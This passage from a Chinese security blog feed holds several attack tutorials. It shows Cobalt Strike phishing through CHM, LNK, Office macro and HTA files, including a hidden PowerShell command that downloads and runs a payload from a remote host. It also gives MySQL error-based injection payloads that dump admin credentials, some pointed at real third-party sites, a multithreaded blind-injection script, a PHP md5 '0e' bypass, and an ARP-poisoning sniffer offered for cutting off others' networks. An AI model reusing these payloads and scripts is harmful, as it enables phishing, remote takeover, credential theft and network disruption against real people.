src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrtxrovnj30e008fjsh.jpg" alt=""></p><ul><li>listener为监听器名字</li><li>output为输出靶机类型。</li><li>点击generate弹出的对话框中选择保存位置和输入payload名字。</li></ul><p>在windows靶机中双击payload生成文件（artifact.exe）</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrwdkheej30680a6abx.jpg" alt=""></p><p>得到反弹shell</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrwozazij30lc0e5ta0.jpg" alt=""></p><p>主机上线以后需要将默认刷新时间改成0，cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿。</p><p>修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定</p><p><strong>右键弹出的内容下拉菜单中选择Interact，上线主机。</strong></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtrxwn4ggj30g90amgm3.jpg" alt=""></p><h2 id="office钓鱼"><a href="#office钓鱼" class="headerlink" title="office钓鱼"></a>office钓鱼</h2><p>office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。</p><p>Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行</p><h3 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h3><p>点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro</p><p>弹出界面选择Listener，单机确定</p><p>对话框中给出每一步仔细操作，单机copy macro按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts0m79xfj30f8095ta3.jpg" alt=""></p><h3 id="word操作"><a href="#word操作" class="headerlink" title="word操作"></a>word操作</h3><ul><li>点击上方标签视图标签</li><li>在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单机创建按钮</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts1ei6p6j30as09sq3l.jpg" alt=""></p><ul><li>首先清空所有代码，然后将生成的代码复制到编辑器中，关闭宏编辑窗口</li><li>保存退出</li><li>双击再次运行保存的文档</li></ul><p>当目标机器运行文档以后，Cobalt Strike会接受到目标机器反弹的shell</p><p>目标则会增加一个rundll32.exe的进程</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts228nc4j30jg0bstdi.jpg" alt=""></p><h2 id="CVE-2017-11882漏洞简介"><a href="#CVE-2017-11882漏洞简介" class="headerlink" title="CVE-2017-11882漏洞简介"></a>CVE-2017-11882漏洞简介</h2><ul><li>漏洞为0ffice内存破坏漏洞，影响目前流行的所有0ffice版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</li><li>该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。</li></ul><h3 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h3><ul><li>Microsoft Office 2007</li><li>Microsoft Office 2010</li><li>Microsoft Office 2013</li><li>Microsoft Office 2016</li></ul><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>下载<a href="https://github.com/Ridter/CVE-2017-11882python" target="_blank" rel="noopener">https://github.com/Ridter/CVE-2017-11882python</a>攻击脚本。</p><p>虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。</p><pre><code>python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxts7532m1j30ez06wjtz.jpg" alt=""></p><h2 id="CHM钓鱼"><a href="#CHM钓鱼" class="headerlink" title="CHM钓鱼"></a>CHM钓鱼</h2><h3 id="CHM介绍"><a href="#CHM介绍" class="headerlink" title="CHM介绍"></a>CHM介绍</h3><ul><li>CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</li><li>利用CHM钓鱼主要原因是因为该文档可以执行cmd命令</li></ul><p>这里制作CHM需要用到一个工具就是 <strong>EasyCHM</strong></p><h3 id="CHM制作过程："><a href="#CHM制作过程：" class="headerlink" title="CHM制作过程："></a>CHM制作过程：</h3><p>创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsaxyhptj30if04yt8t.jpg" alt=""></p><p>先将下列代码复制到根文件夹中的index.html中。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>打开我们的EasyCHM工具</p><p>后点击新建</p><p>然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsbuxzlmj30hu0gpgmr.jpg" alt=""></p><p>它会给你生产一个CHM文件，给别人发过去，一旦点击就会给弹出计算机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsc8a106j30fn0df75c.jpg" alt=""></p><h3 id="生成钓鱼文件"><a href="#生成钓鱼文件" class="headerlink" title="生成钓鱼文件"></a>生成钓鱼文件</h3><p>启动Cobalt Strike，点击attacks——&gt;web Drive by——&gt;scripted web Delivery在弹出的对话框中将type类型设置为powershell然后单击launch按钮</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtse09s5lj30g20a60to.jpg" alt=""></p><p>再用代码将上面创建的根文件夹中的index.html代码中的calc.exe替换掉。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtse84g0ij306w03zaa1.jpg" alt=""></p><pre><code> &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.209.151:81/aa&apos;))&quot;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>生产CHM发送给别人，点击后获得反弹的shell</p><h2 id="LNK钓鱼"><a href="#LNK钓鱼" class="headerlink" title="LNK钓鱼"></a>LNK钓鱼</h2><ul><li>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</li><li>lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。</li></ul><h3 id="先做个简单的powershell生产图标："><a href="#先做个简单的powershell生产图标：" class="headerlink" title="先做个简单的powershell生产图标："></a>先做个简单的powershell生产图标：</h3><p>创建个txt文本写入下面代码然后改文件后缀名为.ps1。</p><pre><code>cmd /c calc.exe</code></pre><p> 右键文件powershell运行后会弹出计算器</p><h3 id="钓鱼方法："><a href="#钓鱼方法：" class="headerlink" title="钓鱼方法："></a>钓鱼方法：</h3><p>首先通过Cobalt Strike的attacks——&gt;web Drive by——&gt;scripted web Delivery</p><p>tpye类型为powershell，然后单机launch。生产代码。</p><p>还记的上面做的那个简单的powershell么，后缀改回txt，将生成的代码替换掉calc.exe</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsh3ya15j30ha06cdg5.jpg" alt=""></p><p> 将下面的powershell代码写入.ps1文件，右键运行powershell。</p><pre><code>$file = Get-Content &quot;test.txt&quot;$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;)$Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot;$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;$Shortcut.Arguments = &apos;                                                                                                                                                                                                                                    &apos;+ $file$Shortcut.Save()</code></pre><p>生成test.lnk文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在<code>%SystemRoot%\System32\Shell32.dll</code>目录下）</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsi0fbj1j30i202jt8p.jpg" alt=""></p><p>后将test.lnk发送给他人，获得反弹shell。</p><h2 id="HTA钓鱼"><a href="#HTA钓鱼" class="headerlink" title="HTA钓鱼"></a>HTA钓鱼</h2><ul><li>HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。</li><li>HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。</li><li>就是一个html应用程序，双击就能运行。</li></ul><h3 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a>复现：</h3><p>Cobalt Strike，attacks——&gt;packages——&gt;HTML application</p><p>选择powershell然后单机generate，选择保存路径。</p><p>将生成的.hta文件发送给别人，点击后获得shell</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsjla457j30rk05qjty.jpg" alt=""></p><h2 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h2><ul><li>Cobalt Strike还能够实现网站克隆</li><li>cotalt strike能够快速复制目标网站前端页面，并且复制相识度极高</li><li>cotalt strike同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器。</li></ul><p>点击attacks——&gt;Web Drive-by——&gt;Clone site</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsocsziuj309u07tq3j.jpg" alt=""></p><ul><li>Clone URL：克隆目标网站的URL（如果网站不是80端口的话域名后得跟上端口号。）</li><li>注意问题：URL需要添加http协议和端口（80）</li><li>Local URL：本地克隆路径</li><li>Local Host：本地主机IP</li><li>Local Port：本地端口</li><li>Attack：克隆后目标网站执行脚本，如：flash漏洞</li></ul><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtspws7kmj30qf0fs475.jpg" alt=""></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>相信你已经能拿到一个beacon的shell了。</p><p>下面是一些基本的使用命令，但是cs监听器对中文支持并不友好，会对中文产生乱码。</p><pre><code>help     查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样,eg: help checkin note     给当前目录机器起个名字, eg: note beacon-shellcd     在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用&apos;/&apos; eg: cd c:\\mkdir      新建目录, eg: mkdir d:\\beaconrm      删除文件或目录, eg: rm d:\\beaconupload      上传文件到目标系统中download 从目标系统下载指定文件,eg: download C:\\Users\\win7cn\\Desktop\\putty.execancel     取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下shell     在目标系统中执行指定的cmd命令, eg: shell whoamigetuid      查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权pwd     查看当前在目录系统中的路径ls     列出当前目录下的所有文件和目录drives     列表出目标系统的所有分区[win中叫盘符]ps     查看目标系统当前的所有的进程列表kill     杀掉指定进程, eg: kill 4653sleep 10 指定被控端休眠时间,默认60秒一次回传,让被控端每10秒来下载一次任务,实际中频率不宜过快,容易被发现,80左右一次即可jobs     列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除jobkill     如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, eg: jobkill 1345clear     清除beacon内部的任务队列checkin     强制让被控端回连一次exit      终止当前beacon 会话ctrl + k 清屏</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsmcb19nj30hn08qdgq.jpg" alt=""></p><blockquote><p>有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cobalt-Strike简介：&quot;&gt;&lt;a href=&quot;#Cobalt-Strike简介：&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike简介：&quot;&gt;&lt;/a&gt;Cobalt Strike简介：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;
      
    
    </summary>
    
      <category term="渗透工具" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL报错注入方法整理</title>
    <link href="http://yoursite.com/2018/12/03/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2018/12/03/MySQL报错注入方法整理/</id>
    <published>2018-12-03T09:24:50.000Z</published>
    <updated>2018-12-03T09:32:40.750Z</updated>
    
    <content type="html"><![CDATA[<p>mysql暴错注入方法整理：通过<strong>floor</strong>，<strong>UpdateXml</strong>，<strong>ExtractValue</strong>，<strong>NAME_CONST</strong>，<strong>Error based Double Query Injection</strong>等方法。</p><p>报错注入：（and后不能直接跟select，可以加（））</p><ul><li>1.报错注入floor—-&gt;<code>(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1</code></li><li>2.报错注入extractvalue—-&gt;<code>select extractvalue(1,concat(0x5c,([payload])))</code></li><li>3.报错注入updatexml—-&gt;<code>select 1=(updatexml(1,concat(0x3a,([payload])),1))</code></li><li>4.报错注入Exp—-&gt;<code>select Exp(~(select * from ([payload])a))</code></li></ul><h2 id="通过floor暴错-原理在底部"><a href="#通过floor暴错-原理在底部" class="headerlink" title="通过floor暴错(原理在底部)"></a>通过floor暴错(原理在底部)</h2><h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+</code></pre><h3 id="简单办法暴库"><a href="#简单办法暴库" class="headerlink" title="/简单办法暴库/"></a>/简单办法暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=info()</code></pre><h3 id="连接用户"><a href="#连接用户" class="headerlink" title="/连接用户/"></a>/连接用户/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="/连接数据库/"></a>/连接数据库/</h3><pre><code>http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+</code></pre><h3 id="暴库"><a href="#暴库" class="headerlink" title="/暴库/"></a>/暴库/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴表"><a href="#暴表" class="headerlink" title="/暴表/"></a>/暴表/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴字段"><a href="#暴字段" class="headerlink" title="/暴字段/"></a>/暴字段/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="暴内容"><a href="#暴内容" class="headerlink" title="/暴内容/"></a>/暴内容/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)</code></pre><h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))</code></pre><h3 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></pre><h3 id="NAME-CONST-适用于低版本"><a href="#NAME-CONST-适用于低版本" class="headerlink" title="NAME_CONST(适用于低版本)"></a>NAME_CONST(适用于低版本)</h3><pre><code>http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--</code></pre><h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><pre><code>(http://www.vaibs.in/error-based-double-query-injection/)</code></pre><h3 id="数据库版本-1"><a href="#数据库版本-1" class="headerlink" title="/数据库版本/"></a>/数据库版本/</h3><pre><code>http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1</code></pre><h3 id="floor报错详解"><a href="#floor报错详解" class="headerlink" title="floor报错详解"></a>floor报错详解</h3><pre><code>floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1</code></pre><ul><li>Rand() //随机函数</li><li>Floor() //取整函数</li><li>Count() //聚合函数</li><li>Group by key //分组语句</li></ul><blockquote><p>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。</p></blockquote><blockquote><p>0x3a   ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。</p></blockquote><p><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mysql暴错注入方法整理：通过&lt;strong&gt;floor&lt;/strong&gt;，&lt;strong&gt;UpdateXml&lt;/strong&gt;，&lt;strong&gt;ExtractValue&lt;/strong&gt;，&lt;strong&gt;NAME_CONST&lt;/strong&gt;，&lt;strong&gt;Error
      
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP绕过md5</title>
    <link href="http://yoursite.com/2018/12/03/PHP%E7%BB%95%E8%BF%87md5/"/>
    <id>http://yoursite.com/2018/12/03/PHP绕过md5/</id>
    <published>2018-12-03T08:27:27.000Z</published>
    <updated>2018-12-03T08:30:00.821Z</updated>
    
    <content type="html"><![CDATA[<p>测试代码：</p><pre><code>if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) {       $logined = true;    $Username = $_GET[&apos;Username&apos;];    $password = $_GET[&apos;password&apos;];    if (!ctype_alpha($Username)) {$logined = false;}    if (!is_numeric($password) ) {$logined = false;}    if (md5($Username) != md5($password)) {$logined = false;}    if ($logined){        echo &quot;successful&quot;;    } else {        echo &quot;login failed!&quot;;    }}</code></pre><p>在做用户登录的时候常常会用到md5加密计算比较密码，md5后相等，就可以成功执行下一步语句，登录成功。但是这样做并不安全，因为 <strong>0e</strong>在比较的时候会将其视作为科学计数法，所以无论<strong>0e</strong>后面是什么，0的多少次方还是0。</p><h2 id="md5开头是0e的字符串"><a href="#md5开头是0e的字符串" class="headerlink" title="md5开头是0e的字符串:"></a>md5开头是0e的字符串:</h2><pre><code>QNKCDZO： 0e830400451993494058024219903391 s878926199a： 0e545993274517709034328855841020 s155964671a： 0e342768416822451524974117254469 s214587387a： 0e848240448830537924465865611904 s214587387a： 0e848240448830537924465865611904 s878926199a： 0e545993274517709034328855841020 s1091221200a： 0e940624217856561557816327384675</code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用全等 <code>===</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;apos;Username&amp;apos;]) &amp;amp;&amp;amp; isset($_GET[&amp;apos;password&amp;apos;])) {
       $logined = true;
    
      
    
    </summary>
    
      <category term="加密解密" scheme="http://yoursite.com/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>比二分法更OK的盲注多线程</title>
    <link href="http://yoursite.com/2018/12/03/%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://yoursite.com/2018/12/03/比二分法更OK的盲注多线程/</id>
    <published>2018-12-03T08:15:08.000Z</published>
    <updated>2018-12-03T08:19:08.702Z</updated>
    
    <content type="html"><![CDATA[<p>废话不多说，直接上脚本：</p><pre><code>import threadingimport requestsuser_agent = [            &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;,            &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;]class MyThread(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func = func        self.args = args    def getresult(self):        return self.res    def run(self):        self.res = self.func(*self.args)def asc(a,i,payload):    asci = 2**i    url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot;    header = {&apos;User-Agent&apos;: user_agent[i]}    html = requests.get(url, headers=header)    if html.text.find(&quot;You are in...........&quot;)!=-1:        return asci    return 0def main():    payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;)    a=1    f=True    char = &apos;&apos;    while f:        threads = []        sum = 0        for i in range(0,8):            t = MyThread(asc, (a, i, payload))            threads.append(t)        for i in range(0,8):            threads[i].start()        for i in range(0,8):            threads[i].join()            sum = sum + threads[i].getresult()        if sum ==0:            f = False        char = char +chr(sum)        a = a+1    print(char)if __name__ == &apos;__main__&apos;:    main()</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmpo7ywrj3118044q3h.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;废话不多说，直接上脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import threading
import requests
user_agent = [
            &amp;quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/53
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>python实现ARP攻击</title>
    <link href="http://yoursite.com/2018/12/03/python%E5%AE%9E%E7%8E%B0ARP%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/12/03/python实现ARP攻击/</id>
    <published>2018-12-03T08:05:10.000Z</published>
    <updated>2018-12-03T08:12:31.113Z</updated>
    
    <content type="html"><![CDATA[<pre><code>from scapy.all import *import osimport sysimport threadingimport signalinterface = &apos;Realtek PCIe GBE Family Controller&apos;target_ip=&apos;10.60.17.12&apos;gateway_ip=&apos;10.60.17.1&apos;packet_count=1000#设置嗅探的网卡conf.iface=interface#关闭输出conf.verb = 0print(&apos;[*]Setting up&apos;+interface)def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):    print(&apos;[*]Restoring target.....&apos;)    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5)    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5)    #发送退出信号到主线程    os.kill(os.getpid(),signal.SIGINT)def get_mac(ip_address):    responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10)    for s, r in responses:        return r[Ether].src    return Nonedef poison_target(gateway_ip, gateway_mac, target_ip, target_mac):    poison_target = ARP()    poison_target.op = 2    poison_target.psrc = gateway_ip    poison_target.pdst = target_ip    poison_target.hwdst = target_mac    poison_gateway = ARP()    poison_gateway.op = 2    poison_gateway.psrc = target_ip    poison_gateway.pdst = gateway_ip    poison_gateway.hwdst = gateway_mac    print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;)    while True:        try:            send(poison_target)            send(poison_gateway)            time.sleep(2)        except KeyboardInterrupt:            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)    print(&quot;[*] ARP poison attack finished.&quot;)    returngateway_mac = get_mac(gateway_ip)if gateway_mac is None:    print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;)    sys.exit(0)else:    print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac))target_mac = get_mac(target_ip)if target_mac is None:    print(&apos;[!!!]Faile to get target MAC. Exiting&apos;)    sys.exit(0)else:    print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac))#开启ARP攻击线程poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))poison_thread.start()try:    print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count)    bpf_filter = &apos;ip host %s&apos;%target_ip    packes = sniff(count=packet_count,filter=bpf_filter,iface=interface)    #将捕获到的数据包传输到文件    wrpcap(&apos;arper.pcap&apos;,packes)    #还原网络配置    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)except  KeyboardInterrupt:    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)    sys.exit(0)</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtmiyon6cj30in06uwer.jpg" alt=""></p><p>好了，现在可以断别人网了….</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;from scapy.all import *
import os
import sys
import threading
import signal

